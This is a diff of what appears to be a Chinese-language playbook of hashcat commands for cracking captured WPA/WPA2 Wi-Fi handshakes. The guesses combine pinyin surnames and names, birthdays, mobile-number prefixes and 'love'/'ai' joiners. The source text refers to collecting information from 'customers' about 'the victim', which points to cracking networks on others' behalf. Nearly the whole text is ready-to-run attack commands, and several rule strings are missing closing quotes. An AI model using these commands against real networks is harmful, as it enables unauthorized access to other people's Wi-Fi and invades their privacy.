+    `./hashcat64.bin -m 2500 hash.hccapx -w 3 -a 1 years_months_days.txt family_names.txt `
+* ~~姓全拼＋月日 (vice versa)~~
     `hashcat64.exe --force -m 2500 hash.hccapx -a 6 lfamily_name.txt -1 01 -2 0123 ?1?d?2?d`
     `hashcat64.exe --force -m 2500 hash.hccapx -a 7 -1 01 -2 0123 ?1?d?2?d lfamily_name.txt`
     `hashcat64.exe --force -m 2500 hash.hccapx -a 6 cfamily_name.txt -1 01 -2 0123 ?1?d?2?d`
     `hashcat64.exe --force -m 2500 hash.hccapx -a 7 -1 01 -2 0123 ?1?d?2?d cfamily_name.txt`
     `hashcat64.exe --force -m 2500 hash.hccapx -a 6 ufamily_name.txt -1 01 -2 0123 ?1?d?2?d`
     `hashcat64.exe --force -m 2500 hash.hccapx -a 7 -1 01 -2 0123 ?1?d?2?d ufamily_name.txt`
-* 姓全拼＋手机号 (vice versa)
+* 姓全拼＋月日
+    `./hashcat64.bin -m 2500 hash.hccapx -w 3 -a 1 family_names.txt months_days.txt`
+* 月日＋姓全拼
+    `./hashcat64.bin -m 2500 hash.hccapx -w 3 -a 1 months_days.txt family_names.txt `
+* ~~姓全拼＋手机号 (vice versa)~~
     `hashcat64.exe --force -m 2500 hash.hccapx -a 6 cfamily_name.txt 130?d?d?d?d?d?d?d?d`
     `hashcat64.exe --force -m 2500 hash.hccapx -a 6 cfamily_name.txt 131?d?d?d?d?d?d?d?d`
     `hashcat64.exe --force -m 2500 hash.hccapx -a 6 cfamily_name.txt 132?d?d?d?d?d?d?d?d`
@@ -933,35 +1211,56 @@ Ask as much information as you can from the customers knowing about the victim.
     `hashcat64.exe --force -m 2500 hash.hccapx -a 7 189?d?d?d?d?d?d?d?d ufamily_name.txt`
     `hashcat64.exe --force -m 2500 hash.hccapx -a 7 199?d?d?d?d?d?d?d?d ufamily_name.txt`
     `hashcat64.exe --force -m 2500 hash.hccapx -a 7 198?d?d?d?d?d?d?d?d ufamily_name.txt`
-* 名字全拼＋名字全拼＋月日 (vice versa)
-`J:\hashcat-5.0.0>hashcat-utils-1.9\bin\combinator3.exe names_cn.txt names_cn.txt months_days.txt | hashcat64.exe --force -d 3 -m 2500 -a 0 J:\cap\TP-LINK_54AA-01\TP-LINK_54AA-01.hccapx`
-* 名字全拼＋月日＋名字全拼 (vice versa)
-`J:\hashcat-5.0.0>hashcat-utils-1.9\bin\combinator3.exe names_cn.txt months_days.txt names_cn.txt | hashcat64.exe --force -d 3 -m 2500 -a 0 J:\cap\TP-LINK_54AA-01\TP-LINK_54AA-01.hccapx`
-* 姓全拼＋姓全拼＋月日 (vice versa)
+* 姓全拼＋手机号
+    `./hashcat64.bin -m 2500 hash.hccapx -a 6 family_names.txt mobile_number_mask.hcmask`
+* 手机号＋姓全拼
+    `./hashcat64.bin -m 2500 hash.hccapx -a 7 mobile_number_mask.hcmask family_names.txt`
+* ~~名字全拼＋名字全拼＋月日 (vice versa)~~
+`hashcat-utils-1.9/bin/combinator.bin names_cn.txt months_days.txt > names_months_days.txt`
+`hashcat64.exe --force -m 2500 hash_file -a 1 names_cn.txt names_months_days.txt`
+* 名字全拼＋名字全拼＋月日
+    `./hashcat-utils-1.9/bin/combinator3.bin names_cn.txt names_cn.txt months_days.txt | ./hashcat64.bin -m 2500 hash.hccapx -w 3 -a 0`
+* 名字全拼＋月日＋名字全拼
+    `./hashcat-utils-1.9/bin/combinator3.bin names_cn.txt months_days.txt names_cn.txt | ./hashcat64.bin -m 2500 hash.hccapx -w 3 -a 0`
+* 姓全拼＋姓全拼＋月日
 `J:\hashcat-5.0.0>hashcat-utils-1.9\bin\combinator3.exe family_names.txt family_names.txt months_days.txt | hashcat64.exe --force -d 3 -m 2500 -a 0 J:\cap\TP-LINK_54AA-01\TP-LINK_54AA-01.hccapx`
-* 姓全拼＋月日＋姓全拼 (vice versa)
+* 姓全拼＋月日＋姓全拼
 `J:\hashcat-5.0.0>hashcat-utils-1.9\bin\combinator3.exe family_names.txt months_days.txt family_names.txt | hashcat64.exe --force -d 3 -m 2500 -a 0 J:\cap\TP-LINK_54AA-01\TP-LINK_54AA-01.hccapx`
 * 年月日＋年月日
     * 年月日：`./hashcat-utils-1.9/bin/combinator.bin years.txt months_days.txt > years_months_days.txt`
-    * 年月日＋年月日：
+    * ~~年月日＋年月日：~~
         * `./hashcat-utils-1.9/bin/combinator.bin years_months_days.txt years_months_days.txt > years_months_days_years_months_days.txt`
         * `hashcat64.exe -D 2 -a 1 years_months_days.txt years_months_days.txt --stdout > years_months_days_years_months_days.txt`
+    * `./hashcat64.bin -m 2500 hash.hccapx -w 3 -a 1 years_months_days.txt years_months_days.txt`
 * 月日＋月日
-    * `./hashcat-utils-1.9/bin/combinator.bin months_days.txt months_days.txt > months_days_months_days.txt`
-    * `hashcat64.exe -D 2 -a 1 months_days.txt months_days.txt --stdout > months_days_months_days.txt`
+    * ~~`./hashcat-utils-1.9/bin/combinator.bin months_days.txt months_days.txt > months_days_months_days.txt`~~
+    * ~~`hashcat64.exe -D 2 -a 1 months_days.txt months_days.txt --stdout > months_days_months_days.txt`~~
+    * `./hashcat64.bin -m 2500 hash.hccapx -w 3 -a 1 months_days.txt months_days.txt`
 * 年月日＋月日
-    * `./hashcat-utils-1.9/bin/combinator.bin years_months_days.txt months_days.txt > years_months_days_months_days.txt`
-    * `hashcat64.exe -D 2 -a 1 years_months_days.txt months_days.txt --stdout > years_months_days_months_days.txt`
-* 2声母+love+2声母
-* 2声母+love+3声母 (vice versa)
-* 3声母+love+3声母
+    * ~~`./hashcat-utils-1.9/bin/combinator.bin years_months_days.txt months_days.txt > years_months_days_months_days.txt`~~
+    * ~~`hashcat64.exe -D 2 -a 1 years_months_days.txt months_days.txt --stdout > years_months_days_months_days.txt`~~
+    * `./hashcat64.bin -m 2500 hash.hccapx -w 3 -a 1 years_months_days.txt months_days.txt`
+* ~~2声母+love+2声母~~
+* ~~2声母+love+3声母 (vice versa)~~
+* ~~3声母+love+3声母~~
+* 声母+love+声母
+    `./hashcat64.bin -m 2500 hash.hccapx -w 3 -a 1 shengmu.txt shengmu.txt -j '$l$o$v$e'`
 * 名字全拼+love+名字全拼
+    `./hashcat64.bin -m 2500 hash.hccapx -w 3 -a 1 names_cn.txt names_cn.txt -j '$l$o$v$e`
 * 名字全拼+4digits
+    `./hashcat64.bin -m 2500 hash.hccapx -w 3 -a 6 names_cn.txt 1234d.hcmask`
 * 姓全拼+love+姓全拼
-* 2声母+ai+2声母
-* 2声母+ai+3声母 (vice versa)
-* 3声母+ai+3声母
+    `./hashcat64.bin -m 2500 hash.hccapx -w 3 -a 1 family_names.txt family_names.txt -j '$l$o$v$e`
+* ~~2声母+ai+2声母~~
+* ~~2声母+ai+3声母 (vice versa)~~
+* ~~3声母+ai+3声母~~
+* ~~名字全拼+ai+名字全拼~~
+* ~~姓全拼+ai+姓全拼~~
+* 声母+ai+声母
+    `./hashcat64.bin -m 2500 hash.hccapx -w 3 -a 1 shengmu.txt shengmu.txt -j '$a$i'`
 * 名字全拼+ai+名字全拼
+    `./hashcat64.bin -m 2500 hash.hccapx -w 3 -a 1 names_cn.txt names_cn.txt -j '$a$i`
 * 姓全拼+ai+姓全拼
-* 名字全拼+4digits
+    `./hashcat64.bin -m 2500 hash.hccapx -w 3 -a 1 family_names.txt family_names.txt -j '$a$i`
 * 姓全拼+4digits
+    `./hashcat64.bin -m 2500 hash.hccapx -w 3 -a 6 family_names.txt 1234d.hcmask`
